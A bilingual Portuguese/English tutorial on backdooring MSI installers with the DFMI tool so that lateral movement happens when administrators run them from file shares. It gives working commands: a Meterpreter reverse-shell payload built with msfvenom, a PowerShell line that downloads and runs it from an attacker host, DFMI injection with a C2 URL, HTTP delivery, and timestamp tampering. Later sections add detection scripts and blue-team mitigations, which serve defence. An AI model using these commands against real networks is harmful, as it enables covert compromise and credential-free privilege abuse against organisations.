2. Contexto e Relevância / Context and Relevance Original

Em grandes empresas, é comum encontrar partilhas de ficheiros cheias de software que os administradores instalam em workstations e servidores. Alguns admins deixam essas partilhas totalmente acessíveis a qualquer pessoa, porque pensam que não há nada de valioso lá. Esses instaladores podem ser backdoored sem os quebrar. Da próxima vez que um administrador os executar, o backdoor corre com os seus privilégios, permitindo movimento lateral sem saber a password. In big companies you often find file shares full of software that admins install on workstations and servers. Some admins leave those shares fully accessible to anyone, because they think there is nothing valuable. Those installers can be backdoored without breaking them. Next time an administrator runs it, the backdoor executes under their privileges, which can let you move laterally without knowing their password.

4. Módulos DFMI Original Complementar

O DFMI oferece três métodos distintos para abusar de ficheiros MSI : DFMI offers three distinct methods for abusing MSI files :
MóduloFunção / FunctionLimitação / Limitation
injectInjeta um CustomAction num MSI existenteModifica o MSI (hash muda)
rogue-mstGera um .mst (transform) que injeta o backdoor sem alterar o MSI originalRequer Windows para gerar o .mst; precisa de dois ficheiros no deploy
stubCria um MSI malicioso de raiz, sem instalador originalNão tem assinatura legítima
Nota / Note:
O artigo do Hackers-Arise foca-se apenas no módulo inject. O rogue-mst é a variante mais furtiva porque mantém a assinatura Authenticode do MSI original intacta. The Hackers-Arise article focuses only on the inject module. rogue-mst is the stealthier variant because it keeps the original MSI's Authenticode signature intact.

5. Injeção com inject Original

Escolhe um instalador MSI. O artigo usa o 7-Zip por ser comum. Pick an MSI installer. The article uses 7-Zip because it's common. 
kali > wget https://github.com/ip7z/7zip/releases/download/26.03/7z2603-x64.msi -O 7zip_original.msi
Gera o payload com Metasploit: Generate the payload with Metasploit: 
kali > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o payload.exe
Cria o script PowerShell que descarrega e executa o payload: Create the PowerShell script that downloads and runs the payload: 
Invoke-WebRequest -Uri "http://IP:PORT/payload.exe" -OutFile "C:\Temp\payload.exe"; Start-Process "C:\Temp\payload.exe"
Injeta o payload no instalador: Inject the payload into the installer: 
kali > python3 dfmi.py inject 7zip_original.msi 7zip_backdoor.msi --c2 http://192.168.131.7:8000/payload.ps1
O instalador resultante continua funcional. Quando a vítima o executa, uma janela de terminal aparece brevemente (comportamento comum em software legítimo) e a ligação C2 é estabelecida. The resulting installer remains functional. When the victim runs it, a terminal window briefly pops up (common behavior in legitimate software) and the C2 connection is established.

6. Delivery Original

Agrupa os backdoors num diretório e sobe um servidor HTTP para entregar à vítima: Group the backdoors into a directory and set up an HTTP server to deliver them: 
kali > ls
kali > python3 -m http.server
Alterar o timestamp do ficheiro na partilha torna-o mais credível. O instalador backdoored pode ser colocado numa partilha de software existente, onde os admins o executam naturalmente. Changing the file timestamp in the share makes it look more trustworthy. The backdoored installer can be placed in an existing software share, where admins run it naturally.

7.2 Script 29.2 — Deteção de msiexec com Parâmetros Suspeitos / msiexec Detection

Objetivo: detetar msiexec.exe com /qn (silencioso) ou TRANSFORMS= em eventos 4688. Evidência: msiexec-detect.csv. Goal: detect msiexec.exe with /qn (silent) or TRANSFORMS= in events 4688. Evidence: msiexec-detect.csv. 
# Script 29.2 - msiexec Detection
$out = ".\msiexec-detect.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $proc = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
    $cmd  = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    if ($proc -match "msiexec\.exe" -and ($cmd -match "/qn" -or $cmd -match "TRANSFORMS=")) {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Process=$proc; Command=$cmd }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] msiexec hits: $($hits.Count) -> $out" -ForegroundColor Yellow

7.3 Script 29.3 — Verificação de Assinatura de MSI / MSI Signature Check

Objetivo: verificar se um MSI tem assinatura Authenticode válida (o rogue-mst mantém a assinatura, mas o stub e o inject não). Evidência: output no ecrã. Goal: check if an MSI has a valid Authenticode signature (rogue-mst keeps it, but stub and inject don't). Evidence: on-screen output. 
# Script 29.3 - MSI Signature Check
param([Parameter(Mandatory)][string]$MsiPath)
$sig = Get-AuthenticodeSignature -FilePath $MsiPath
if ($sig.Status -eq "Valid") {
  Write-Host "[+] Valid signature: $($sig.SignerCertificate.Subject)" -ForegroundColor Green
} else {
  Write-Host "[!] Invalid or missing signature: $($sig.Status)" -ForegroundColor Red
}

9. Mitigações Blue Team / Mitigations Complementar

  1. Verificar assinaturas MSI — Script 29.3. O rogue-mst mantém a assinatura, mas o inject e o stub não.
  2. Monitorizar msiexec com /qn e TRANSFORMS= — Script 29.2.
  3. Inspecionar CustomActions em MSIs não assinados — Script 29.1.
  4. Restringir partilhas de software — apenas admins com necessidade devem poder escrever.
  5. AppLocker/WDAC — bloquear MSIs não assinados ou de fontes não confiáveis.
  6. Monitorizar downloads de MSI em workstations de admin.
